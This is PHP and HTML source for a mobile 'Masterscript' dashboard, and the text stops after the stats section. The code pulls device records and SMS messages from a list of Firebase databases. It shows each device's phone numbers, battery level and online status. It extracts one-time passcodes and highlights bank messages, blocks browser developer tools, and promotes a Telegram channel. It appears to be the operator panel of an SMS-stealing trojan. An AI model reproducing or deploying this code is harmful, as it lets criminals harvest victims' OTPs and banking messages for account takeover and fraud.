<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

$CONFIG_FILE = __DIR__ . '/firebase_urls.json';

// Load URLs from JSON file or use defaults
function loadFirebaseUrls() {
    global $CONFIG_FILE;
    if (file_exists($CONFIG_FILE)) {
        $content = file_get_contents($CONFIG_FILE);
        $data = json_decode($content, true);
        if (is_array($data) && !empty($data)) {
            return $data;
        }
    }
    // Default fallback
    return [
        'https://rizzlatest-default-rtdb.firebaseio.com'
    ];
}

function saveFirebaseUrls($urls) {
    global $CONFIG_FILE;
    $urls = array_values(array_unique(array_filter($urls)));
    file_put_contents($CONFIG_FILE, json_encode($urls, JSON_PRETTY_PRINT));
    return $urls;
}

// Handle AJAX requests for URL management
if (isset($_GET['ajax']) && $_GET['ajax'] === 'urls') {
    header('Content-Type: application/json');
    $action = $_GET['url_action'] ?? '';
    $urls = loadFirebaseUrls();

    if ($action === 'add' && isset($_GET['url'])) {
        $newUrl = trim($_GET['url']);
        if (filter_var($newUrl, FILTER_VALIDATE_URL) && strpos($newUrl, 'firebaseio.com') !== false) {
            $urls[] = $newUrl;
            $urls = saveFirebaseUrls($urls);
            echo json_encode(['status' => 'success', 'urls' => $urls]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invalid Firebase URL']);
        }
        exit;
    }

    if ($action === 'delete' && isset($_GET['index'])) {
        $index = (int)$_GET['index'];
        if (isset($urls[$index])) {
            unset($urls[$index]);
            $urls = saveFirebaseUrls($urls);
            echo json_encode(['status' => 'success', 'urls' => $urls]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'URL not found']);
        }
        exit;
    }

    if ($action === 'list') {
        echo json_encode(['status' => 'success', 'urls' => $urls]);
        exit;
    }

    echo json_encode(['status' => 'error', 'message' => 'Invalid action']);
    exit;
}

// ---------- FIREBASE PANELS (from JSON) ----------
$FIREBASE_URLS = loadFirebaseUrls();

// ---------- Helper functions ----------
function fetchFirebase($url, $path = '', $timeout = 6) {
    $full = rtrim($url, '/') . '/' . ltrim($path, '/') . '.json';
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $full,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CONNECTTIMEOUT => 2
    ]);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($err) return null;
    return json_decode($res, true);
}

function extractAllNumbers($data) {
    $numbers = [];
    if (is_array($data) || is_object($data)) {
        foreach ($data as $key => $value) {
            if (is_array($value) || is_object($value)) {
                $numbers = array_merge($numbers, extractAllNumbers($value));
            } elseif (is_string($value) && preg_match('/\b(\d{10,15})\b/', $value, $matches)) {
                $num = preg_replace('/\D/', '', $matches[1]);
                if (strlen($num) >= 10) $numbers[] = substr($num, -10);
            }
        }
    }
    return $numbers;
}

function getDevicesWithMessages($rootData) {
    $devices = [];
    if (!is_array($rootData)) return $devices;

    if (isset($rootData['clients']) && is_array($rootData['clients'])) {
        foreach ($rootData['clients'] as $id => $data) {
            if (!is_array($data)) continue;
            $nums = extractAllNumbers($data);
            $nums = array_unique($nums);
            $online = isset($data['status']) ? (bool)$data['status'] : false;
            if (isset($data['online'])) $online = (bool)$data['online'];
            $devices[$id] = [
                'numbers' => $nums,
                'online' => $online,
                'battery' => $data['battery'] ?? null,
                'raw' => $data
            ];
        }
    }

    if (isset($rootData['messages']) && is_array($rootData['messages'])) {
        foreach ($rootData['messages'] as $deviceId => $msgs) {
            if (!is_array($msgs)) continue;
            if (!isset($devices[$deviceId])) {
                $devices[$deviceId] = [
                    'numbers' => [],
                    'online' => false,
                    'battery' => null,
                    'raw' => null
                ];
            }
            $msgNumbers = extractAllNumbers($msgs);
            $devices[$deviceId]['numbers'] = array_unique(
                array_merge($devices[$deviceId]['numbers'], $msgNumbers)
            );
        }
    }

    return $devices;
}

function getMessages($panelUrl, $deviceId) {
    $data = fetchFirebase($panelUrl, "messages/$deviceId", 5);
    return is_array($data) ? $data : [];
}

function extractOTP($msg) {
    if (empty($msg)) return null;
    preg_match('/\b(\d{4,8})\b/', $msg, $m);
    return $m[1] ?? null;
}

// ==================== PAGE ROUTING ====================
$action = $_GET['action'] ?? 'panels';
$panelUrl = $_GET['panel'] ?? '';
$deviceId = $_GET['device'] ?? '';

$devices = [];
$messages = [];
$selectedNumbers = [];
$rootData = null;
$errorMessage = null;
$isApi = isset($_GET['api']);

// API Endpoint for frontend
if ($isApi) {
    header('Content-Type: application/json');
    $api = $_GET['api'] ?? '';

    if ($api === 'devices') {
        $allDevices = [];
        foreach ($FIREBASE_URLS as $idx => $url) {
            $data = fetchFirebase($url, '', 4);
            if (is_array($data)) {
                $devs = getDevicesWithMessages($data);
                foreach ($devs as $did => $info) {
                    $allDevices[] = [
                        'did' => $did,
                        'db_index' => $idx,
                        'name' => substr($did, 0, 20),
                        'rawPhone' => isset($info['numbers'][0]) ? $info['numbers'][0] : '',
                        'battery' => $info['battery'] ?? 0,
                        'online' => $info['online'] ?? false,
                        'numbers' => $info['numbers'] ?? []
                    ];
                }
            }
        }
        echo json_encode(['status' => 'success', 'data' => $allDevices]);
        exit;
    }

    if ($api === 'sms') {
        $dbIndex = (int)($_GET['db_index'] ?? 0);
        $did = $_GET['did'] ?? '';
        if (isset($FIREBASE_URLS[$dbIndex]) && $did) {
            $msgs = getMessages($FIREBASE_URLS[$dbIndex], $did);
            echo json_encode(['status' => 'success', 'data' => $msgs]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invalid parameters']);
        }
        exit;
    }

    echo json_encode(['status' => 'error', 'message' => 'Unknown API']);
    exit;
}

if ($panelUrl) {
    $rootData = fetchFirebase($panelUrl, '', 5);
    if (is_array($rootData) && isset($rootData['error'])) {
        $errorMessage = $rootData['error'];
    } elseif ($rootData) {
        $devices = getDevicesWithMessages($rootData);
        if ($deviceId && isset($devices[$deviceId])) {
            $messages = getMessages($panelUrl, $deviceId);
            $selectedNumbers = $devices[$deviceId]['numbers'] ?? [];
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Panel Dashboard - Masterscript</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode === 123) return false;
            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) return false;
            if (e.ctrlKey && e.keyCode === 85) return false;
        };
    </script>
    <style>
        /* ===== ROOT ===== */
        :root {
            --bg: #f7f7f8;
            --bg2: #eff3ff;
            --bg3: #ffffff;
            --bg4: #f3f4f6;
            --card: #ffffff;
            --card2: #f8fafc;
            --card3: #f1f5f9;
            --ink: #111118;
            --ink2: #6c6c80;
            --ink3: #b0b0c0;
            --text: #111118;
            --text2: #3f3f46;
            --muted: #6c6c80;
            --muted2: #8b8b9d;
            --border: #e5e5ea;
            --border2: #d1d5db;
            --teal: #15803d;
            --teal3: #f0fdf4;
            --blue: #2563eb;
            --blue3: #eff3ff;
            --amber: #d97706;
            --amber3: #fffbeb;
            --red: #b91c1c;
            --red3: #fef2f2;
            --purple: #7c3aed;
            --purple3: #f5f3ff;
            --sky: #0ea5e9;
            --f: 'Inter', sans-serif;
            --r: 14px;
        }
        *, *::before, *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        html {
            font-size: 14px;
            scroll-behavior: smooth;
            background: #000;
        }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: var(--f);
            min-height: 100vh;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
            user-select: none;
        }
        #root {
            position: relative;
            z-index: 1;
            display: flex;
            min-height: 100vh;
            justify-content: center;
            background: #000;
        }

        /* ===== MAIN LAYOUT ===== */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-width: 0;
            max-width: 480px;
            width: 100%;
            background: var(--bg);
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
            position: relative;
        }

        /* ===== TOPBAR ===== */
        .topbar {
            background: var(--card);
            border-bottom: 1px solid var(--border);
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 30;
            border-radius: 0 0 16px 16px;
            margin-bottom: 16px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.02);
        }
        .tb-logo {
            font-size: 20px;
            font-weight: 800;
            color: var(--ink);
            display: flex;
            align-items: center;
            gap: 8px;
            letter-spacing: -.3px;
        }
        .tb-logo span {
            color: var(--blue);
        }
        .tb-actions {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .btn-t {
            background: var(--card2);
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 14px;
            color: var(--ink);
            cursor: pointer;
            padding: 6px 10px;
            transition: all .2s;
        }
        .btn-t:hover {
            background: var(--border);
        }
        .btn-t.telegram-btn {
            background: #0088cc;
            color: #fff;
            border-color: #0088cc;
        }
        .btn-t.telegram-btn:hover {
            background: #006699;
            border-color: #006699;
        }

        /* ===== SEARCH ===== */
        .sw {
            padding: 0 16px;
            margin-bottom: 16px;
            position: relative;
        }
        .srch-ico {
            position: absolute;
            left: 30px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--ink3);
            font-size: 14px;
        }
        .srch {
            width: 100%;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 14px 14px 14px 40px;
            color: var(--ink);
            font-family: var(--f);
            font-size: 14px;
            outline: none;
            transition: border-color .2s;
        }
        .srch:focus {
            border-color: var(--blue);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, .1);
        }

        /* ===== HERO STATS ===== */
        .hero {
            padding: 0 16px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 16px;
        }
        .hcard {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--r);
            padding: 16px;
            text-align: center;
        }
        .hc-lbl {
            font-size: 11px;
            color: var(--ink2);
            text-transform: uppercase;
            font-weight: 700;
            margin-top: 4px;
        }
        .hc-val {
            font-family: 'JetBrains Mono', monospace;
            font-size: 24px;
            font-weight: 800;
        }
        .hc-val.b {
            color: var(--blue);
        }
        .hc-val.t {
            color: var(--teal);
        }

        /* ===== DEVICE LIST ===== */
        .cnt {
            padding: 0 16px 24px;
            flex: 1;
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
        }
        .ncard {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 16px;
            overflow: hidden;
            position: relative;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.01);
            transition: transform 0.2s;
        }
        .ncard:hover {
            transform: translateY(-2px);
            border-color: var(--border2);
        }
        .ncard-top {
            padding: 16px 16px 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .nnum-group {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .nnum {
            font-family: 'JetBrains Mono', monospace;
            font-size: 17px;
            font-weight: 800;
            color: var(--ink);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .copy-icon-btn {
            background: var(--blue3);
            border: 1px solid rgba(37, 99, 235, 0.2);
            cursor: pointer;
            color: var(--blue);
            width: 28px;
            height: 28px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all .15s;
            font-size: 13px;
        }
        .copy-icon-btn:hover {
            background: var(--blue);
            color: #fff;
        }
        .ncard-mid {
            padding: 0 16px 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .nbat {
            font-size: 12px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 4px;
            padding: 4px 8px;
            border-radius: 6px;
            background: var(--card2);
            border: 1px solid var(--border);
        }
        .nbat.hi {
            color: var(--teal);
        }
        .nbat.md {
            color: var(--amber);
        }
        .nbat.lo {
            color: var(--red);
        }
        .ntag {
            font-size: 11px;
            border-radius: 6px;
            padding: 4px 8px;
            font-weight: 700;
            background: var(--card2);
            color: var(--ink2);
            border: 1px solid var(--border);
        }
        .ntag.on {
            color: var(--teal);
            background: var(--teal3);
            border-color: rgba(21, 128, 61, 0.2);
        }
        .ncard-btn {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 16px;
            border-top: 1px solid var(--border);
            background: var(--card2);
            cursor: pointer;
            transition: background 0.2s;
        }
        .ncard-btn:hover {
            background: var(--blue3);
        }
        .ncard-btn-lbl {
            font-size: 13px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 6px;
            color: var(--blue);
        }

        /* ===== EMPTY STATE ===== */
        .sm-empty {
            text-align: center;
            padding: 40px 20px;
            color: var(--ink3);
        }
        .sm-ei {
            font-size: 32px;
            margin-bottom: 12px;
        }
        .sm-et {
            font-size: 14px;
            font-weight: 600;
        }

        /* ===== SKELETON ===== */
        .sk-item {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            animation: blink 1s ease infinite;
        }
        @keyframes blink {
            50% {
                opacity: 0.5;
            }
        }
        .sk-l {
            height: 12px;
            border-radius: 6px;
            background: var(--bg4);
            margin-bottom: 12px;
            width: 40%;
        }
        .sk-t {
            height: 10px;
            border-radius: 5px;
            background: var(--bg4);
            margin-bottom: 8px;
        }

        /* ===== OVERLAY / MODAL ===== */
        .ov {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(2px);
            z-index: 100;
            align-items: flex-end;
            justify-content: center;
        }
        .ov.open {
            display: flex;
        }
        .modal {
            background: var(--bg);
            width: 100%;
            max-width: 480px;
            border-radius: 20px 20px 0 0;
            height: 85vh;
            display: flex;
            flex-direction: column;
            animation: slideUp .3s ease;
            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.1);
        }
        @keyframes slideUp {
            from {
                transform: translateY(100%);
            }
            to {
                transform: translateY(0);
            }
        }
        .mh {
            padding: 16px 20px;
            border-bottom: 1px solid var(--border);
            background: var(--card);
            border-radius: 20px 20px 0 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .mh-left {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .mh-num {
            font-family: 'JetBrains Mono', monospace;
            font-size: 18px;
            font-weight: 800;
            color: var(--ink);
            display: flex;
            align-items: center;
            gap: 8px;
        }
                .close-btn {
            background: var(--card2);
            border: 1px solid var(--border);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            color: var(--ink2);
            cursor: pointer;
            transition: all 0.2s;
        }
        .close-btn:hover {
            background: var(--red3);
            color: var(--red);
            border-color: rgba(185, 28, 28, 0.2);
        }
        .mfil {
            padding: 12px 16px;
            display: flex;
            gap: 8px;
            overflow-x: auto;
            background: var(--card);
            border-bottom: 1px solid var(--border);
        }
        .mfil::-webkit-scrollbar {
            display: none;
        }
        .fb {
            white-space: nowrap;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 6px 14px;
            font-size: 12px;
            font-family: var(--f);
            color: var(--ink2);
            cursor: pointer;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .fb.act {
            background: var(--blue);
            color: #fff;
            border-color: var(--blue);
        }

        .mlist {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            background: var(--bg);
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .si {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px;
            position: relative;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
        }
        .si.otp {
            border-left: 4px solid var(--blue);
        }
        .si.bank {
            border-left: 4px solid var(--teal);
        }
        .si.promo {
            border-left: 4px solid var(--amber);
        }
        .si.spam {
            border-left: 4px solid var(--red);
        }
        .si.other {
            border-left: 4px solid var(--border2);
        }
        .si-h {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .si-sender {
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            font-weight: 800;
            color: var(--ink);
            display: flex;
            align-items: center;
            gap: 8px;
            text-transform: uppercase;
        }
        .si-time {
            font-size: 12px;
            color: var(--ink2);
            font-weight: 600;
        }
        .si-body {
            font-size: 13.5px;
            color: var(--text2);
            line-height: 1.5;
            word-break: break-word;
            user-select: text;
            margin-bottom: 16px;
        }
        .si-body code {
            background: var(--blue3);
            color: var(--blue);
            border-radius: 6px;
            padding: 2px 6px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 800;
            border: 1px solid rgba(37, 99, 235, 0.2);
        }
        .si-actions {
            display: flex;
            border-top: 1px solid var(--border);
            padding-top: 16px;
        }
        .si-copy {
            width: 100%;
            background: var(--card2);
            border: 1px solid var(--border);
            cursor: pointer;
            font-size: 13px;
            font-weight: 700;
            color: var(--text2);
            padding: 10px;
            border-radius: 8px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s;
        }
        .si-copy:hover {
            color: var(--blue);
            border-color: rgba(37, 99, 235, 0.3);
            background: var(--blue3);
        }
        .new-b {
            position: absolute;
            top: -10px;
            right: 16px;
            background: var(--red);
            color: #fff;
            font-size: 10px;
            font-weight: 800;
            padding: 3px 8px;
            border-radius: 12px;
            text-transform: uppercase;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        /* ===== COPY TOAST ===== */
        .copied-tip {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--ink);
            color: #fff;
            font-size: 13px;
            font-weight: 700;
            padding: 10px 20px;
            border-radius: 30px;
            z-index: 500;
            animation: ctip .3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        @keyframes ctip {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        /* ============================================================
                   SIDEBAR / PANEL – Slide-in from right
                   ============================================================ */
        .side-toggle {
            position: fixed;
            right: 20px;
            bottom: 90px;
            z-index: 60;
            background: var(--blue);
            color: #fff;
            border: none;
            border-radius: 50%;
            width: 56px;
            height: 56px;
            font-size: 24px;
            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.4);
            cursor: pointer;
            transition: all 0.25s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .side-toggle:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 28px rgba(37, 99, 235, 0.5);
        }
        .side-toggle i {
            transition: transform 0.3s;
        }
        .side-toggle.open i {
            transform: rotate(180deg);
        }

        .side-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(2px);
            z-index: 70;
            display: none;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .side-overlay.open {
            display: block;
            opacity: 1;
        }

        .side-panel {
            position: fixed;
            right: -420px;
            top: 0;
            width: 400px;
            max-width: 92vw;
            height: 100vh;
            background: var(--bg);
            z-index: 80;
            box-shadow: -8px 0 40px rgba(0, 0, 0, 0.12);
            transition: right 0.35s cubic-bezier(0.22, 1, 0.36, 1);
            display: flex;
            flex-direction: column;
            border-radius: 20px 0 0 20px;
            overflow: hidden;
        }
        .side-panel.open {
            right: 0;
        }

        .side-header {
            padding: 20px 24px;
            border-bottom: 1px solid var(--border);
            background: var(--card);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .side-header h3 {
            font-size: 18px;
            font-weight: 800;
            color: var(--ink);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .side-header h3 i {
            color: var(--blue);
        }
        .side-close {
            background: var(--card2);
            border: 1px solid var(--border);
            border-radius: 50%;
            width: 34px;
            height: 34px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            cursor: pointer;
            color: var(--ink2);
            transition: all 0.2s;
        }
        .side-close:hover {
            background: var(--red3);
            color: var(--red);
            border-color: rgba(185, 28, 28, 0.2);
        }

        .side-body {
            flex: 1;
            overflow-y: auto;
            padding: 20px 24px 30px;
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        /* ---- Telegram Section ---- */
        .telegram-section {
            background: linear-gradient(135deg, #0088cc, #005f8a);
            border-radius: 16px;
            padding: 22px 20px;
            color: #fff;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .telegram-section::after {
            content: '';
            position: absolute;
            top: -50%;
            right: -30%;
            width: 200px;
            height: 200px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.06);
            pointer-events: none;
        }
        .telegram-section .tg-icon {
            font-size: 40px;
            margin-bottom: 10px;
            display: block;
        }
        .telegram-section h4 {
            font-size: 18px;
            font-weight: 800;
            margin-bottom: 4px;
        }
        .telegram-section p {
            font-size: 13px;
            opacity: 0.85;
            margin-bottom: 14px;
        }
        .telegram-section .tg-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: #fff;
            color: #0088cc;
            border: none;
            padding: 10px 28px;
            border-radius: 30px;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
        }
        .telegram-section .tg-btn:hover {
            transform: scale(1.03);
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
        }

        /* ---- Free Line / Masterscript ---- */
        .free-line {
            background: var(--card2);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .free-line .fl-label {
            font-size: 13px;
            font-weight: 600;
            color: var(--ink2);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .free-line .fl-label i {
            color: var(--amber);
        }
        .free-line .fl-tag {
            background: var(--blue3);
            color: var(--blue);
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 14px;
            padding: 4px 14px;
            border-radius: 20px;
            border: 1px solid rgba(37, 99, 235, 0.2);
        }
        .free-line .fl-copy {
            background: transparent;
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 4px 10px;
            cursor: pointer;
            color: var(--ink2);
            transition: all 0.2s;
        }
        .free-line .fl-copy:hover {
            background: var(--blue3);
            color: var(--blue);
            border-color: var(--blue);
        }

        /* ---- Firebase URL Manager ---- */
        .url-manager {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
        }
        .url-manager .um-header {
            padding: 14px 18px;
            background: var(--card2);
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-weight: 700;
            font-size: 14px;
            color: var(--ink);
        }
        .url-manager .um-header i {
            color: var(--blue);
        }
        .url-manager .um-body {
            padding: 14px 18px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .url-manager .um-add-row {
            display: flex;
            gap: 8px;
        }
        .url-manager .um-add-row input {
            flex: 1;
            padding: 10px 12px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 13px;
            font-family: var(--f);
            background: var(--bg);
            color: var(--ink);
            outline: none;
            transition: border-color 0.2s;
        }
        .url-manager .um-add-row input:focus {
            border-color: var(--blue);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.08);
        }
        .url-manager .um-add-row button {
            padding: 10px 18px;
            background: var(--blue);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
        }
        .url-manager .um-add-row button:hover {
            background: #1d4ed8;
        }
        .url-manager .um-list {
            display: flex;
            flex-direction: column;
            gap: 6px;
            max-height: 220px;
            overflow-y: auto;
        }
          .url-manager .um-add-row button:hover {
            background: #1d4ed8;
        }
        .url-manager .um-list {
            display: flex;
            flex-direction: column;
            gap: 6px;
            max-height: 220px;
            overflow-y: auto;
        }
        .url-manager .um-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 12px;
            background: var(--bg);
            border-radius: 8px;
            border: 1px solid var(--border);
            font-size: 12px;
            font-family: 'JetBrains Mono', monospace;
            color: var(--text2);
            gap: 8px;
        }
        .url-manager .um-item .um-url {
            flex: 1;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .url-manager .um-item .um-del {
            background: var(--red3);
            border: 1px solid rgba(185, 28, 28, 0.2);
            color: var(--red);
            border-radius: 6px;
            padding: 2px 10px;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
        }
        .url-manager .um-item .um-del:hover {
            background: var(--red);
            color: #fff;
        }
        .um-empty {
            text-align: center;
            padding: 16px;
            color: var(--ink3);
            font-size: 13px;
        }
        .um-toast {
            font-size: 12px;
            color: var(--teal);
            font-weight: 600;
            padding: 4px 0;
        }
        .um-toast.error {
            color: var(--red);
        }

        /* ===== WELCOME POPUP ===== */
        .welcome-popup {
            position: fixed;
            inset: 0;
            z-index: 999;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(6px);
            animation: fadeIn .4s ease;
        }
        .welcome-popup.open {
            display: flex;
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.96);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        .welcome-card {
            background: var(--card);
            border-radius: 24px;
            max-width: 420px;
            width: 92%;
            padding: 36px 32px 32px;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
            position: relative;
            animation: popIn .5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        @keyframes popIn {
            from {
                opacity: 0;
                transform: scale(0.85) translateY(30px);
            }
            to {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }
        .welcome-card .wc-icon {
            font-size: 56px;
            color: #0088cc;
            margin-bottom: 12px;
            display: block;
        }
        .welcome-card h2 {
            font-size: 24px;
            font-weight: 800;
            color: var(--ink);
            margin-bottom: 6px;
        }
        .welcome-card p {
            color: var(--ink2);
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .welcome-card .wc-btn {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            background: #0088cc;
            color: #fff;
            border: none;
            padding: 14px 34px;
            border-radius: 40px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.25s;
            text-decoration: none;
        }
        .welcome-card .wc-btn:hover {
            transform: scale(1.03);
            box-shadow: 0 8px 24px rgba(0, 136, 204, 0.35);
        }
        .welcome-card .wc-skip {
            display: block;
            margin-top: 16px;
            background: transparent;
            border: none;
            color: var(--ink3);
            font-size: 13px;
            cursor: pointer;
            text-decoration: underline;
            padding: 6px 12px;
        }
        .welcome-card .wc-skip:hover {
            color: var(--ink2);
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .side-panel {
                width: 100vw;
                max-width: 100vw;
                border-radius: 0;
                right: -100vw;
            }
            .side-panel.open {
                right: 0;
            }
            .side-toggle {
                right: 14px;
                bottom: 80px;
                width: 48px;
                height: 48px;
                font-size: 20px;
            }
            .welcome-card {
                padding: 28px 20px 24px;
            }
            .welcome-card h2 {
                font-size: 20px;
            }
            .url-manager .um-add-row {
                flex-wrap: wrap;
            }
            .url-manager .um-add-row input {
                flex: 1 1 100%;
            }
            .url-manager .um-add-row button {
                flex: 1;
            }
            .hero {
                grid-template-columns: 1fr 1fr;
                gap: 8px;
            }
            .hc-val {
                font-size: 20px;
            }
            .nnum {
                font-size: 14px;
            }
            .topbar {
                padding: 12px 16px;
            }
            .tb-logo {
                font-size: 17px;
            }
            .side-body {
                padding: 16px 18px 24px;
            }
        }
        @media (max-width: 360px) {
            .hero {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>

    <!-- ===== WELCOME POPUP ===== -->
    <div class="welcome-popup" id="welcomePopup">
        <div class="welcome-card">
            <span class="wc-icon"><i class="fab fa-telegram-plane"></i></span>
            <h2>Join Our Telegram</h2>
            <p>
                Stay updated with the latest tools, SMS alerts, and exclusive
                content. Join our community on Telegram!
            </p>
            <a href="https://t.me/masterscript" target="_blank" class="wc-btn">
                <i class="fab fa-telegram-plane"></i> Join @masterscript
            </a>
            <button class="wc-skip" onclick="closeWelcome()">Skip for now</button>
        </div>
    </div>

    <!-- ===== MAIN APP ===== -->
    <div id="root">
        <main class="main" id="mainApp">
            <!-- Topbar -->
            <div class="topbar">
                <div class="tb-logo">
                    <i class="fas fa-bolt" style="color:var(--amber);"></i>Dashboard<span></span>
                </div>
                <div class="tb-actions">
                    <button class="btn-t" onclick="loadDevices()" title="Refresh">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                    <button class="btn-t telegram-btn" onclick="openSidePanel()" title="Telegram &amp; Settings">
                        <i class="fab fa-telegram-plane"></i>
                    </button>
                </div>
            </div>
            <!-- Search -->
            <div class="sw">
                <i class="fas fa-search srch-ico"></i>
                <input class="srch" id="srch" placeholder="Search numbers or models..." oninput="onSearch()">
            </div>

            <!-- Hero Stats -->
            <div class="hero">
                <div class="hcard">
                    <div class="hc-val b" id="st-nums">0</div>
                    <div class="hc-lbl">Online Numbers</div>
                </div>
                <div class="hcard">
                    <div class="hc-val t" id="st-on">0</div>
                    <div class="hc-lbl">Active DBs</div>
                </div>
            </div>

